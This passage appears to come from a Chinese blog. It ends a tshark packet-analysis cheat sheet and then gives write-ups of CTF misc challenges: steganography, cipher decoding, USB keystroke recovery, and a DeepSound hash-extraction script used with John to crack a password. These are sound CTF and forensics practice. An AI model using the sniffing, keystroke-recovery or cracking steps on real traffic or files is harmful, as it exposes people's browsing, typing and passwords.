当-T字段指定时，设置输出选项，header=y意思是头部要打印;　　　　</span><br><span class="line">-e: 当-T字段指定时，设置输出哪些字段;　　　　 </span><br><span class="line">&gt;: 重定向;</span><br><span class="line"></span><br><span class="line">//统计http状态</span><br><span class="line">tshark -n -q -z http,stat, -z http,tree　　　</span><br><span class="line">注释:</span><br><span class="line">-q: 只在结束捕获时输出数据，针对于统计类的命令非常有用;　　　　</span><br><span class="line">-z: 各类统计选项，可以使用tshark -z help命令来查看所有支持的字段;</span><br><span class="line">　　　　　http,stat: 计算HTTP统计信息，显示的值是HTTP状态代码和HTTP请求方法。　　　　　　 </span><br><span class="line">　　　　　http,tree: 计算HTTP包分布。 显示的值是HTTP请求模式和HTTP状态代码。</span><br><span class="line"></span><br><span class="line">//抓取500个包提取访问的网址打印出来</span><br><span class="line">tshark -s 0 -i eth0 -n -f &#x27;tcp dst port 80&#x27; -R &#x27;http.host and http.request.uri&#x27; -T fields -e http.host -e http.request.uri -l -c 500</span><br><span class="line">注释: 　　　　</span><br><span class="line">-f: 抓包前过滤；　　　　</span><br><span class="line">-R: 抓包后过滤；　　　　</span><br><span class="line">-l: 在打印结果之前清空缓存;　　　　</span><br><span class="line">-c: 在抓500个包之后结束;</span><br><span class="line"></span><br><span class="line">//读取指定报文,按照ssl过滤显示内容</span><br><span class="line">tshark -r temp.cap -R &quot;ssl&quot; -V -T text　　</span><br><span class="line">注释: 　　　　</span><br><span class="line">-T text: 格式化输出，默认就是text;　　　　</span><br><span class="line">-V: 增加包的输出;//-q 过滤tcp流13，获取data内容</span><br><span class="line"></span><br><span class="line">//提取test.pcapng流量包中的usb.capdata并且写入test.txt</span><br><span class="line">tshark -r &#x27;test.pcapng&#x27; -T fields -e usb.capdata &gt; test.txt</span><br><span class="line"></span><br><span class="line">//显示ssl data数据</span><br><span class="line">tshark -n -t a -R ssl -T fields -e &quot;ip.src&quot; -e &quot;ssl.app_data&quot;</span><br><span class="line"></span><br><span class="line">tshark -r temp.cap -z &quot;follow,tcp,ascii,13&quot;</span><br><span class="line"></span><br><span class="line">//按照指定格式显示-e</span><br><span class="line">tshark -r temp.cap -R ssl -Tfields -e &quot;ip.src&quot; -e tcp.srcport -e ip.dst -e tcp.dstport</span><br><span class="line"></span><br><span class="line">//输出数据</span><br><span class="line">tshark -r vmx.cap -q -n -t ad -z follow,tcp,ascii,10.1.8.130:56087,10.195.4.41:446 | more</span><br><span class="line">注释:　　　　</span><br><span class="line">      -t ad: 输出格式化时间戳;</span><br><span class="line">      </span><br><span class="line">//过滤包的时间和rtp.seq</span><br><span class="line">tshark  -i eth0 -f &quot;udp port 5004&quot;  -T fields -e frame.time_epoch -e rtp.seq -o rtp.heuristic_rtp:true 1&gt;test.txt　　</span><br><span class="line">注释:　　　　</span><br><span class="line">-o: 覆盖属性文件设置的一些值;</span><br><span class="line"></span><br><span class="line">//提取各协议数据部分</span><br><span class="line">tshark -r H:/httpsession.pcap -q -n -t ad -z follow,tcp,ascii,71.6.167.142:27017,101.201.42.120:59381 | more</span><br></pre></td></tr></table></figure><h3 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5.参考链接"></a>5.参考链接</h3><p>tshark官方文档：<a href="https://www.wireshark.org/docs/man-pages/tshark.html">https://www.wireshark.org/docs/man-pages/tshark.html</a></p><p>wireshark wiki：<a href="https://wiki.wireshark.org/">https://wiki.wireshark.org/</a></p><p>捕获过滤器 <a href="https://wiki.wireshark.org/CaptureFilters">https://wiki.wireshark.org/CaptureFilters</a></p><p>显示过滤器，用于display过滤的字段可以通过<a href="https://wiki.wireshark.org/DisplayFilters">https://wiki.wireshark.org/DisplayFilters </a>查询。</p><p>如果不过滤-e指定的字段数据都会输出，通过-R过滤之后，只有满足规则的才会输出，会因此-R和-T、-e通常会一起使用。</p><p>统计：<a href="https://wiki.wireshark.org/Statistics">https://wiki.wireshark.org/Statistics</a></p><p><a href="https://www.cnblogs.com/liun1994/p/6142505.html">https://www.cnblogs.com/liun1994/p/6142505.html</a></p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
            <tag> misc </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buumisc(6)</title>
      <link href="/article/2022-03-18-buumisc(6)/"/>
      <url>/article/2022-03-18-buumisc(6)/</url>
      
        <content type="html"><![CDATA[<p>buu刷题目记录(第6页)</p><span id="more"></span><h1 id="buumisc-6"><a href="#buumisc-6" class="headerlink" title="buumisc(6)"></a>buumisc(6)</h1><p>buu第六页，取证什么的后面在一块学习一下，目前暂时跳过了</p><p><img src="/image/media/2022/ctf/buu/6/0.png"></p><h2 id="INSHack2018-42-tar-xz"><a href="#INSHack2018-42-tar-xz" class="headerlink" title="[INSHack2018]42.tar.xz"></a>[INSHack2018]42.tar.xz</h2><p>压缩包，测试了一个需要疯狂解压解压，python脚本虽然可以，但是会爆盘</p><p>使用bash命令直接循环解压即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while [ &quot;`find . -type f -name &#x27;*.tar.xz&#x27; | wc -l`&quot; -gt 0 ]; do find -type f -name &quot;*.tar.xz&quot; -exec tar xf &#x27;&#123;&#125;&#x27; \; -exec rm -- &#x27;&#123;&#125;&#x27; \;; done;</span><br></pre></td></tr></table></figure><p>得到一堆文件和flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;04ebb0d6a87f9771f2eea4dce5b91a85e7623c13301a8007914085a91b3ca6d9&#125;</span><br></pre></td></tr></table></figure><h2 id="XMAN2018排位赛-AutoKey"><a href="#XMAN2018排位赛-AutoKey" class="headerlink" title="[XMAN2018排位赛]AutoKey"></a>[XMAN2018排位赛]AutoKey</h2><p><a href="https://github.com/WangYihang/UsbKeyboardDataHacker%E5%8F%AF%E4%BB%A5%E7%94%A8%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7">https://github.com/WangYihang/UsbKeyboardDataHacker可以用这个工具</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─# python2 UsbKeyboardDataHacker.py attachment.pcapng</span><br><span class="line">Running as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.</span><br><span class="line">[+] Found : &lt;CAP&gt;a&lt;CAP&gt;utokey(&#x27;****&#x27;).decipheer(&#x27;&lt;CAP&gt;mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexo&lt;DEL&gt;pze&lt;DEL&gt;iz&#x27;)</span><br></pre></td></tr></table></figure><p>然后处理一下密文，把<code>&lt;DEL&gt;</code>前面字母的删去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexpziz</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexpziz</span><br></pre></td></tr></table></figure><p>然后用autokey爆破环境配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">py文件下载地址</span><br><span class="line">http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/</span><br><span class="line">配置文件下载地址</span><br><span class="line">http://www.practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/#a-python-implementation</span><br></pre></td></tr></table></figure><p>得到</p><p><img src="/image/media/2022/ctf/buu/6/1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-674.914569565 autokey, klen 8 :&quot;FLAGHERE&quot;, HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF&#125;</span><br></pre></td></tr></table></figure><h2 id="QCTF2018-X-man-Keyword"><a href="#QCTF2018-X-man-Keyword" class="headerlink" title="[QCTF2018]X-man-Keyword"></a>[QCTF2018]X-man-Keyword</h2><p>得到keyword:lovekfc</p><p>用lsb脚本解密可以得到<a href="https://github.com/livz/cloacked-pixel">https://github.com/livz/cloacked-pixel</a></p><p>PVSF{vVckHejqBOVX9C1c13GFfkHJrjIQeMwf}</p><p>猜测是Nihilist 密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">enc=&#x27;PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;&#x27;</span><br><span class="line">grid=&#x27;LOVEKFC&#x27;+&#x27;ABDGHIJMNPQRSTUWXY&#x27;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in enc:</span><br><span class="line">    if i in string.ascii_lowercase:</span><br><span class="line">        index=grid.lower().index(i)</span><br><span class="line">        flag+=string.ascii_lowercase[index]</span><br><span class="line">        continue</span><br><span class="line">    if i in string.ascii_uppercase:</span><br><span class="line">        index=grid.upper().index(i)</span><br><span class="line">        flag+=string.ascii_uppercase[index]</span><br><span class="line">        continue</span><br><span class="line">    flag+=i</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QCTF&#123;cCgeLdnrIBCX9G1g13KFfeLNsnMRdOwf&#125;</span><br></pre></td></tr></table></figure><h2 id="INSHack2017-hiding-in-plain-sight"><a href="#INSHack2017-hiding-in-plain-sight" class="headerlink" title="[INSHack2017]hiding-in-plain-sight"></a>[INSHack2017]hiding-in-plain-sight</h2><p>直接用binwalk+foremost得到flag的图片</p><p><img src="/image/media/2022/ctf/buu/6/2.jpg"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;l337_h4xx0r5_c0mmun1c473_w17h_PNGs&#125;</span><br></pre></td></tr></table></figure><h2 id="HDCTF2019-信号分析"><a href="#HDCTF2019-信号分析" class="headerlink" title="[HDCTF2019]信号分析"></a>[HDCTF2019]信号分析</h2><p>得到一个wav文件，直接丢到Audacity，选择频谱图</p><p><img src="/image/media/2022/ctf/buu/6/2.png"></p><p>可以看到是重复的频段，所以分析一个即可，然后安装粗1细0区分，得到</p><p>0101010101010101000000110</p><p>然后根据题目名称：PT2242信号：前面4bit表示同步码，中间的20bit表示地址码，后面的4bit表示功能码，最后一位是停止码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0101010101010101     00000011      0#划分后的结果</span><br><span class="line">01 代表 F00 代表 011 代表 1最后的0是结束符</span><br><span class="line">FFFFFFFF0001，最后的0是结束符不计入</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;FFFFFFFF0001&#125;</span><br></pre></td></tr></table></figure><h2 id="INSHack2017-remote-multimedia-controller"><a href="#INSHack2017-remote-multimedia-controller" class="headerlink" title="[INSHack2017]remote-multimedia-controller"></a>[INSHack2017]remote-multimedia-controller</h2><p>得到一个流量包，解压直接搜flag</p><p><img src="/image/media/2022/ctf/buu/6/3.png"></p><p>然后定位到流量包去追踪</p><p><img src="/image/media/2022/ctf/buu/6/4.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vmxkd1NrNVhVbk5qUlZKU1ltdGFjRlJYZEhOaWJFNVhWR3RPV0dKVmJEWldiR1JyV1ZkS1ZXRXphRnBpVkVaVFYycEtVMU5IUmtobFJYQlRUVmhDTmxZeFdtdGhhelZ5WWtWYWFWSlViRmRVVlZaYVRURmFjbFpyT1ZaV2JXUTJWa1pvYTFkck1YVlVhbHBoVWxack1GUlZaRXRqVmxaMVZHMTRXRkpVUlRCWFdIQkdUbGRHY2s1VmFFOVdNWEJoV1Zkek1XSldaSFJPVm1SclZsZDRXbFJWVm5wUVVUMDk=</span><br></pre></td></tr></table></figure><p>经过好几次base64解密之后得到，flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;TCP_s0ck3t_4n4lys1s_c4n_b3_fun!&#125;</span><br></pre></td></tr></table></figure><h2 id="一路到底"><a href="#一路到底" class="headerlink" title="一路到底"></a>一路到底</h2><p>首先得到大量的txt，最下面有个start.txt，然后根据txt中的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20555 : The next is a8242a234560a0d3cf121864ee34d7fb.txt</span><br></pre></td></tr></table></figure><p>可以知道下一个文件的是，a8242a234560a0d3cf121864ee34d7fb.txt，并且20555是效数据</p><p>然后用一个脚本提取所有信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">from tqdm import tqdm</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">with open(&#x27;files/start.txt&#x27;) as f:</span><br><span class="line">    text=f.read()</span><br><span class="line">    nexttxt=text[-36:]</span><br><span class="line">    data=&#x27;&#123;:04x&#125;&#x27;.format(int(text[0:text.find(&#x27;:&#x27;)-1]))#4位小数，并且16进制</span><br><span class="line">    print(type(data))</span><br><span class="line">    flag=flag+data</span><br><span class="line">    print(text, &#x27;\t&#x27;, nexttxt, &#x27;\t&#x27;, data)</span><br><span class="line">    for i in tqdm(range(160000)):</span><br><span class="line">        try:</span><br><span class="line">            with open(&#x27;files/&#x27;+nexttxt) as f:</span><br><span class="line">                text = f.read()</span><br><span class="line">                nexttxt = text[-36:]</span><br><span class="line">                data = &#x27;&#123;:04x&#125;&#x27;.format(int(text[0:text.find(&#x27;:&#x27;) - 1]))</span><br><span class="line">                flag = flag + data</span><br><span class="line">                #print(text, &#x27;\t&#x27;, nexttxt, &#x27;\t&#x27;, data)</span><br><span class="line">        except:</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">with open(&#x27;fla.zip&#x27;,&#x27;wb&#x27;) as f:</span><br><span class="line">    f.write(binascii.unhexlify(flag))</span><br></pre></td></tr></table></figure><p>得到一个压缩包hint：年轻人，能走到这一步不容易啊！不要灰心，密码十分钟就可以破解哦，加油！</p><p>爆破用字母小写+数字，得到密码tgb678，解压得到图片，但是不能直接打开，用010查看文件头，修改文件头为</p><p><img src="/image/media/2022/ctf/buu/6/5.png"></p><p>得到图片，查看得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0c6b489ca956e2fd94dce12be4bf0729&#125;</span><br></pre></td></tr></table></figure><h2 id="RoarCTF2019-forensic"><a href="#RoarCTF2019-forensic" class="headerlink" title="[RoarCTF2019]forensic"></a>[RoarCTF2019]forensic</h2><p>得到没有后缀名的文件，直接打开能看到部分信息，全文可以猜测是python文件，猜测是pyc隐写</p><p>需要用python3.6之前的python版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 stegosaurus.py -x ctf.pyc#Extracted payload: SUCTF&#123;Z3r0_fin411y_d34d&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;Z3r0_fin411y_d34d&#125;</span><br></pre></td></tr></table></figure><h2 id="INSHack2018-not-so-deep"><a href="#INSHack2018-not-so-deep" class="headerlink" title="[INSHack2018] (not) so deep"></a>[INSHack2018] (not) so deep</h2><p>得到一个wav，然后直接放在，Audacity选择频谱分析得到flag的前面部分：flag{Aud1o_st3G4n</p><p><img src="/image/media/2022/ctf/buu/6/6.png"></p><p>然后用deepsound打开的时候需要密码，然后用密码的hash值然后使用john进行爆破，得到密码azerty </p><p><img src="/image/media/2022/ctf/buu/6/7.png"></p><p>附上deepsound_john脚本如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import logging</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import textwrap</span><br><span class="line">def decode_data_low(buf):</span><br><span class="line">  return buf[::2]</span><br><span class="line">def decode_data_normal(buf):</span><br><span class="line">  out = bytearray()</span><br><span class="line">  for i in range(0, len(buf), 4):</span><br><span class="line">    out.append((buf[i] &amp; 15) &lt;&lt; 4 | (buf[i + 2] &amp; 15))</span><br><span class="line">  return out</span><br><span class="line">def decode_data_high(buf):</span><br><span class="line">  out = bytearray()</span><br><span class="line">  for i in range(0, len(buf), 8):</span><br><span class="line">    out.append((buf[i] &amp; 3) &lt;&lt; 6     | (buf[i + 2] &amp; 3) &lt;&lt; 4 \</span><br><span class="line">             | (buf[i + 4] &amp; 3) &lt;&lt; 2 | (buf[i + 6] &amp; 3))</span><br><span class="line">  return out</span><br><span class="line">def is_magic(buf):</span><br><span class="line">  return (buf[0] &amp; 15)  == (68 &gt;&gt; 4) and (buf[2]  &amp; 15) == (68 &amp; 15) \</span><br><span class="line">     and (buf[4] &amp; 15)  == (83 &gt;&gt; 4) and (buf[6]  &amp; 15) == (83 &amp; 15) \</span><br><span class="line">     and (buf[8] &amp; 15)  == (67 &gt;&gt; 4) and (buf[10] &amp; 15) == (67 &amp; 15) \</span><br><span class="line">     and (buf[12] &amp; 15) == (70 &gt;&gt; 4) and (buf[14] &amp; 15) == (70 &amp; 15)</span><br><span class="line">def is_wave(buf):</span><br><span class="line">  return buf[0:4] == b&#x27;RIFF&#x27; and buf[8:12] == b&#x27;WAVE&#x27;</span><br><span class="line">def process_deepsound_file(f):</span><br><span class="line">  bname = os.path.basename(f.name)</span><br><span class="line">  logger = logging.getLogger(bname)</span><br><span class="line">  buf = f.read(12)</span><br><span class="line">  if not is_wave(buf):</span><br><span class="line">    global convert_warn</span><br><span class="line">    logger.error(&#x27;file not in .wav format&#x27;)</span><br><span class="line">    convert_warn = True</span><br><span class="line">    return</span><br><span class="line">  f.seek(0, os.SEEK_SET)</span><br><span class="line">  hdrsz = 104</span><br><span class="line">  hdr = None</span><br><span class="line">  while True:</span><br><span class="line">    off = f.tell()</span><br><span class="line">    buf = f.read(hdrsz)</span><br><span class="line">    if len(buf) &lt; hdrsz: break</span><br><span class="line">    if is_magic(buf):</span><br><span class="line">          hdr = decode_data_normal(buf)</span><br><span class="line">          logger.info(&#x27;found DeepSound header at offset %i&#x27;, off)</span><br><span class="line">          break</span><br><span class="line">    f.seek(-hdrsz + 1, os.SEEK_CUR)</span><br><span class="line">  if hdr is None:</span><br><span class="line">    logger.warn(&#x27;does not appear to be a DeepSound file&#x27;)</span><br><span class="line">    return</span><br><span class="line">  mode = hdr[4]</span><br><span class="line">  encrypted = hdr[5]</span><br><span class="line">  modes = &#123;2: &#x27;low&#x27;, 4: &#x27;normal&#x27;, 8: &#x27;high&#x27;&#125;</span><br><span class="line">  if mode in modes:</span><br><span class="line">    logger.info(&#x27;data is encoded in %s-quality mode&#x27;, modes[mode])</span><br><span class="line">  else:</span><br><span class="line">    logger.error(&#x27;unexpected data encoding mode %i&#x27;, modes[mode])</span><br><span class="line">    return</span><br><span class="line">  if encrypted == 0:</span><br><span class="line">    logger.warn(&#x27;file is not encrypted&#x27;)</span><br><span class="line">    return</span><br><span class="line">  elif encrypted != 1:</span><br><span class="line">    logger.error(&#x27;unexpected encryption flag %i&#x27;, encrypted)</span><br><span class="line">    return</span><br><span class="line">  sha1 = hdr[6:6+20]</span><br><span class="line">  print(&#x27;%s:$dynamic_1529$%s&#x27; % (bname, sha1.hex()))</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  import argparse</span><br><span class="line">  parser = argparse.ArgumentParser()</span><br><span class="line">  parser.add_argument(&#x27;--verbose&#x27;, &#x27;-v&#x27;, action=&#x27;store_true&#x27;)</span><br><span class="line">  parser.add_argument(&#x27;files&#x27;, nargs=&#x27;+&#x27;, metavar=&#x27;file&#x27;,</span><br><span class="line">    type=argparse.FileType(&#x27;rb&#x27;, bufsize=4096))</span><br><span class="line">  args = parser.parse_args()</span><br><span class="line">  if args.verbose:</span><br><span class="line">    logging.basicConfig(level=logging.INFO)</span><br><span class="line">  else:</span><br><span class="line">    logging.basicConfig(level=logging.WARN)</span><br><span class="line">  convert_warn = False</span><br><span class="line">  for f in args.files:</span><br><span class="line">    process_deepsound_file(f)</span><br><span class="line"></span><br><span class="line">  if convert_warn:</span><br><span class="line">    print(textwrap.dedent(&#x27;&#x27;&#x27;</span><br><span class="line">    ---------------------------------------------------------------</span><br><span class="line">    Some files were not in .wav format. Try converting them to .wav</span><br><span class="line">    and try again. You can use: ffmpeg -i input output.wav</span><br><span class="line">    ---------------------------------------------------------------&#x27;&#x27;&#x27;.rstrip()), file=sys.stderr)</span><br></pre></td></tr></table></figure><p>然后用得到的密码azerty 去用deepsound打开得到0_1s_4lwayS_Th3_S4me}拼接完整flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Aud1o_st3G4n0_1s_4lwayS_Th3_S4me&#125;</span><br></pre></td></tr></table></figure><h2 id="INSHack2017-10-cl0v3rf13ld-lane-signal"><a href="#INSHack2017-10-cl0v3rf13ld-lane-signal" class="headerlink" title="[INSHack2017]10-cl0v3rf13ld-lane-signal"></a>[INSHack2017]10-cl0v3rf13ld-lane-signal</h2><p>得到一个没有后缀名的文件，用file查看是个jpg文件，修改后缀名后可以看到下面</p><p><img src="/image/media/2022/ctf/buu/6/1.jpg"></p><p>然后binwalk+foremost得到</p><p><img src="/image/media/2022/ctf/buu/6/00000075.png" alt="00000075"></p><p>可以看到左下角有信息</p><p><img src="/image/media/2022/ctf/buu/6/8.png" alt="8"></p><p>根据上面表格得到信息：HELPME，继续分析一开始的图片，在一个END后面发现ogg</p><p><img src="/image/media/2022/ctf/buu/6/9.png"></p><p>Ogg全称是OGGVobis(oggVorbis)是一种音频压缩格式，类似于MP3等的音乐格式。新建一个文件把内容保存出来后缀名MP3</p><p>用Audacity打开看到莫斯密码</p><p><img src="/image/media/2022/ctf/buu/6/10.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.. -. ... .- -.--. -- ----- .-. ..... ...-- ..--.- .-- .---- .-.. .-.. ..--.- -. ...-- ...- ...-- .-. ..--.- ....- --. ...-- -.-.-- -.--.-</span><br></pre></td></tr></table></figure><p>解密后得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA(M0R53_W1LL_N3V3R_4G3!)</span><br></pre></td></tr></table></figure><h2 id="watevrCTF-2019-Unspaellablle"><a href="#watevrCTF-2019-Unspaellablle" class="headerlink" title="[watevrCTF 2019]Unspaellablle"></a>[watevrCTF 2019]Unspaellablle</h2><p>可以知道是<a href="https://imsdb.com/transcripts/Stargate-SG1-Children-Of-The-Gods.html%E5%8E%9F%E6%96%87">https://imsdb.com/transcripts/Stargate-SG1-Children-Of-The-Gods.html原文</a></p><p>保存下载下来存为1.txt，linux下面使用vimdiff命令查看两个文件的差别，发现把差别字符提取出来也就是flag了。</p><p>命令：vimdiff         attachment.txt         1.txt</p><p><img src="/image/media/2022/ctf/buu/6/11.png"></p><p>提取出红色的字样拼接就是flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watevr&#123;icantspeel_tiny.cc/2qtdez&#125;</span><br></pre></td></tr></table></figure><h2 id="NPUCTF2020-碰上彩虹，吃定彩虹！（未完成）"><a href="#NPUCTF2020-碰上彩虹，吃定彩虹！（未完成）" class="headerlink" title="[NPUCTF2020]碰上彩虹，吃定彩虹！（未完成）"></a>[NPUCTF2020]碰上彩虹，吃定彩虹！（未完成）</h2><p>打开得到三个附件lookatme.txt用np++打开得打</p><p><img src="/image/media/2022/ctf/buu/6/12.png"></p><p>莫斯密码：解密得到AUTOKEY</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.- ..- - --- -.- . -.--</span><br></pre></td></tr></table></figure><p>然后maybehint.txt用0宽隐写解密得到：do u know NTFS?</p><p><img src="/image/media/2022/ctf/buu/6/13.png"></p><p>然后需要用到NTFS</p><h2 id="XMAN2018排位赛-ppap"><a href="#XMAN2018排位赛-ppap" class="headerlink" title="[XMAN2018排位赛]ppap"></a>[XMAN2018排位赛]ppap</h2><p>直接搜flag，然后出来几个流量包，追踪到</p><p><img src="/image/media/2022/ctf/buu/6/14.png"></p><p>复制出来，去掉前面和后面的正常信息，中间114876分界</p><p><img src="/image/media/2022/ctf/buu/6/15.png"></p><p>然后吧114871行道114876行直接拿出来base64解密后保存为zip得到一个加密的zip包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 